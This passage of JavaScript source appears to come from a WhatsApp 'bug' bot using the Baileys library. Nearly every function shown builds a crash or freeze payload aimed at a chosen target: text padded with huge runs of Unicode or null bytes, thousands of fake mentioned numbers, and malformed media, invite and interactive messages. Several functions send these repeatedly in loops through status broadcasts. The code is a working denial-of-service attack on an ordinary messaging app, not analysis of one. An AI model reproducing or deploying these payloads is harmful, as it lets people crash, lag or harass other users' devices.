         extendedTextMessage: { 
            text: "AKU SUKA PERMEN" + LolipopBug,
            matchedText: "PERMENNYA BANG",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "BANG MAKAN PERMEN YOK" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      console.log(chalk.red(`SEND BUG TERKIRIM ${target}`));
   } catch (err) {
      console.error(err);
   }
};

async function LocaliveUI(sock, target) {
  try {
    await sock.sendMessage(target, {
      location: {
        degreesLatitude: -0,
        degreesLongitude: 0,
        name: "Poppies Lane Memory ( Ziee ⸙ )" + "ꦾ".repeat(10000) + "ꦽ".repeat(10000) + "𑜦𑜠".repeat(10000) + "~@1~".repeat(10000),
        address: " "
      }
    })

    await sock.sendMessage(target, {
      liveLocationMessage: {
        degreesLatitude: -0,
        degreesLongitude: 0,
        accuracyInMeters: 5,
        speedInMps: 0,
        degreesClockwiseFromMagneticNorth: 0,
        caption: " ",
        sequenceNumber: 1,
        timeOffset: 0
      }
    })

  } catch (err) {
  }
}

async function StickerRamzx(sock, target) {
  const stickerMsg = {
    message: {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/d/f/A1B2C3D4E5F6G7H8I9J0.webp?ccb=11-4",
        mimetype: "image/webp",
        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
        fileLength: 1173741,
        mediaKeyTimestamp: Date.now(),
        isAnimated: false,
        directPath: "/v/t62.7118-24/sample_sticker.enc",
        contextInfo: {
          mentionedJid: [
            target,
            ...Array.from({ length: 50 }, () =>
              "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
          ],
          participant: target,
          remoteJid: "status@broadcast",
        },
      },
    },
  };

  const audioMessage = {
    message: {
      audioMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
        mimetype: "audio/mpeg",
        fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
        fileLength: 99999999999999,
        seconds: 99999999999999,
        ptt: true,
        mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
        fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
        directPath:
          "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
        mediaKeyTimestamp: 99999999999999,
        contextInfo: {
          mentionedJid: [
            "@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
            ),
          ],
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363375427625764@newsletter",
            serverMessageId: 1,
            newsletterName: "Ramzyy X VLOOD",
          },
        },
        waveform:
          "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==",
      },
    },
  };

  const msg = generateWAMessageFromContent(
    target,
    audioMessage.message,
    { userJid: target }
  );

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  await sock.relayMessage(target, stickerMsg.message, { messageId: msg.key.id });
}

async function audiodelay(sock, target) {
    console.log(`SUCCES SENDING DELAY HARD TO - ${target}`);
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
    const warx = {
        nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3,
            entryPointConversionSource: "StatusMessage",
        },
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: `#${Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")}`,
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: Buffer.from([226,213,217,102,205,126,232,145,0,70,137,73,190,145,0,44,165,102,153,233,111,114,69,10,55,61,186,131,245,153,93,211]),
            fileLength: 432722,
            seconds: 26,
            ptt: false,
            mediaKey: Buffer.from([182,141,235,167,91,254,75,254,190,229,25,16,78,48,98,117,42,71,65,199,10,164,16,57,189,229,54,93,69,6,212,145]),
            fileEncSha256: Buffer.from([29,27,247,158,114,50,140,73,40,108,77,206,2,12,84,131,54,42,63,11,46,208,136,131,224,87,18,220,254,211,83,153]),
            directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
            mediaKeyTimestamp: 1746275400,
            contextInfo: {
                mentionedJid: Array.from({length: 1900}, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`),
                isSampled: true,
                participant: target,
                remoteJid: "status@broadcast",
                forwardingScore: 9741,
                isForwarded: true,
                businessMessageForwardInfo: {businessOwnerJid: "0@s.whatsapp.net"}
            }
        }
    };

    const msgcombo = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {text: "Maklu Entod", format: "DEFAULT"},
                    nativeFlowResponseMessage: {name: "galaxy_message", paramsJson: "\u0000".repeat(145000), version: 3},
                    contextInfo: {
                        mentionedJid: Array.from({length: 1950}, () => "1" + Math.floor(Math.random() * 5000000) + "91@s.whatsapp.net"),
                        isForwarded: true,
                        forwardingScore: 999,
                        forwardedNewsletterMessageInfo: {newsletterJid: "1@newsletter", serverMessageId: 1, newsletterName: "Message"}
                    }
                }
            }
        }
    };

    const spraydelay = {
        viewOnceMessage: {
            message: {
                contactMessage: {
                    displayName: "\u0000".repeat(50000) + "IZIN LEWAT MASS".repeat(50000),
                    vcard: ``,
                    contextInfo: {
                        mentionedJid: Array.from({length: 2000}, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9999,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const relaying = {
        messageId: undefined,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{tag: "to", attrs: {jid: target}, content: []}]
            }]
        }]
    };

    for (let i = 0; i < 75; i++) {
        const msg = generateWAMessageFromContent(target, {
            ...warx,
            contextInfo: {
                ...warx.contextInfo,
                participant: "0@s.whatsapp.net",
                mentionedJid: ["0@s.whatsapp.net", ...Array.from({length: 1900}, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)]
            }
        }, {});

        await Promise.all([
            sock.relayMessage("status@broadcast", msg.message, {...relaying, messageId: msg.key.id}),
            sock.relayMessage("status@broadcast", msgcombo, relaying)
        ]);

        for (let j = 0; j < 10; j++) {
            await sock.relayMessage("status@broadcast", spraydelay, relaying);
        }

        await delay(100);
    }    
    
}

async function autodrains(target) {  
    for (let i = 0; i < 10; i++) {
        let etc = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "You Idiot's",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "carousel_message",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });
      await sock.relayMessage("status@broadcast", etc.message, {
            messageId: etc.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target }, content: undefined }
                            ]
                        }
                    ]
                }
            ]
        });
        
        await sock.relayMessage("status@broadcast", etc.message, {
            messageId: etc.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target }, content: undefined }
                            ]
                        }
                    ]
                }
            ]
        });
        
        console.log(`Send Bug ${i + 1}/100`);        

        if (i < 99) {
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}

async function FloodNaren(target) {

   const vcardPayload = {
        contacts: {
            displayName: "꧀꧀꧀".repeat(25555) + "\u0000\u0000\u0000",
            contacts: [
                {
                    displayName: "ោ៝".repeat(15000) + "\u0003\u0003\u0003",
                    vcard: `BEGIN:VCARD
VERSION:7.0
N:;;;; 
FN:${"ꦾ".repeat(15000) + "\u0000\u0000\u0000"}
item1.TEL;waid=639484734523:+63 948 473 4523
item1.X-ABLabel:Telepon
END:VCARD`
                }
            ]
        },
        contextInfo: {
            participant: target,
            remoteJid: "status@broadcast",
            mentionedJid: [
                target,
                "0@s.whatsapp.net",
                "13135550002@s.whatsapp.net"
            ]
        }
    };
    
    const vcardMsg = generateWAMessageFromContent(target, vcardPayload, {});
    await sock.relayMessage(target, vcardMsg.message, { messageId: "" });
    
    const invitePayload = {
        viewOnceMessage: {
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: "120363418703070877@newsletter",
                    newsletterName: "ោ៝".repeat(20000),
                    jpegThumbnail: Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAUA", "base64"),
                    caption: "ꦾ'ꦾ'".repeat(20000) + "\u0000\u0000\u0000",
                    inviteExpiration: 999999999
                }
            },
            contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: [
                    target,
                    "0@s.whatsapp.net",
                    "13135550002@s.whatsapp.net"
                ]
            }
        }
    };
    const inviteMsg = generateWAMessageFromContent(target, invitePayload, {});
    await sock.relayMessage(target, inviteMsg.message, { messageId: "" });

    console.log(chalk.white.bold(`Bug Newsletter + VCard Blank terkirim ke ${target}`));
}

async function CycsixBrinxtaz(sock, target, mention) {
  const msg1 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: " ", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  }, {});

const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: " Kontol ",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });
    
  const msg3 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x12".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215)
      .toString(16)
      .padStart(6, "99999999")
  });

  const msg4 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };
  const msg5 = {
     extendedTextMessage: {
       text: "ꦾ".repeat(300000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1900 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         };
    let msg6 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "carousel_message",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "@Xatanicvxii",
              newsletterJid: "120363330344810280@newsletter",
              serverMessageId: 1
            },
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  }, {});
    for (const msg of [msg1, msg2, msg3, msg4, msg5, msg6]) {
    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    console.log(chalk.green("SUCCESS SEND BUG"));
  }
}

async function emyuforce(sock, target) {
  try {
    const media = await prepareWAMessageMedia(
      { image: { url: "https://files.catbox.moe/fw80rg.jpg" } },
      { upload: sock.waUploadToServer }
    );

    const msg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              remoteJid: "X",
              stanzaId: "123",
              
              stanzal: "123",
quotedMessage: {
  paymentInviteMessage: {
    serviceType: 3,
    expiryTimestamp: Date.now() + 1814400000,
  },
},
            },
            carouselMessage: {
              messageVersion: 1,
              cards: [
                {
                  header: {
                    hasMediaAttachment: true,
                    media: media.imageMessage,
                  },
                  body: {
                    text:
                      "AMPAS DEY\n\n" + "ꦽ".repeat(50000),
                  },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                          display_text: "Open",
                          url: "https://wa.me/0",
                        }),
                      },
                    ],
                    messageParamsJson: "{}",
                  },
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, msg, { messageId: null });
    console.log("SUCCES SEND CLICK FORCE");
  } catch (err) {
    console.error("ERORRR :", err);
  }
}

async function bulldzoerX(target) {
  await sock.relayMessage(
    target,
    {
      messageContextInfo: {
        deviceListMetadata: {
          senderTimestamp: "1762522364",
          recipientKeyHash: "Cla60tXwl/DbZw==",
          recipientTimestamp: "1763925277"
        },
        deviceListMetadataVersion: 2,
        messageSecret: "QAsh/n71gYTyKcegIlMjLMiY/2cjj1Inh6Sd8ZtmTFE="
      },
      eventMessage: {
        contextInfo: {
          expiration: 0,
          ephemeralSettingTimestamp: "1763822267",
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "UNKNOWN",
            initiatedByMe: true
          }
        },
        isCanceled: true,
        name: "Sharfinā1st 永遠に生きる",
        location: {
          degreesLatitude: 0,
          degreesLongitude: 0,
          name: "Sharfinā1st 永遠に生きる" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000)
        },
        startTime: "1764032400",
        extraGuestsAllowed: true,
        isScheduleCall: true
      }
    },
    { participant: { jid: target } }
  );
}

async function Lixxdelay(target) {
    const TrigerMsg = "\u0003\u0003\u0003\u0003\u0003\u0003\u0003".repeat(150000);
    
    const delaymention = Array.from({ length: 50000 }, (_, r) => ({
        title: TrigerMsg,
        rows: Array(100).fill().map((_, i) => ({ 
            title: TrigerMsg,
            id: `${r + 1}_${i}`,
            description: TrigerMsg,
            subRows: Array(50).fill().map((_, j) => ({
                title: TrigerMsg,
                id: `${r + 1}_${i}_${j}`
            }))
        }))
    }));
    const contextInfo = {
        mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 50000 }, () => 
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            )
        ],
        participant: target,
        remoteJid: "status@broadcast",
        forwardingScore: 9999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "333333333333@newsletter",
            serverMessageId: 999999,
            newsletterName: TrigerMsg
        },
        quotedMessage: {
            locationMessage: {
                degreesLatitude: -9.4882766288,
                degreesLongitude: 9.48827662899,
                name: TrigerMsg.repeat(10),
                address: TrigerMsg,
                url: null
            },
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 50000 }, () => 
                        "2" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                    )
                ],
                quotedMessage: {
                    documentMessage: {
                        title: TrigerMsg.repeat(5),
                        fileLength: "999999999",
                        jpegThumbnail: Buffer.alloc(1000000, 'binary').toString('base64'),
                        contextInfo: {
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 50000 }, () => 
                                    "3" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                )
                            ]
                        }
                    }
                }
            }
        }
    };

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "ErlanggaOfficial " + TrigerMsg,
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { 
                        selectedRowId: "🔴" + TrigerMsg 
                    },
                    contextInfo: contextInfo,
                    description: "Dont Bothering Me Bro!!! " + TrigerMsg
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2,
            expiration: 86400 * 7, // 7 hari
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: Buffer.alloc(1000000, 'binary').toString('base64')
        }
    };

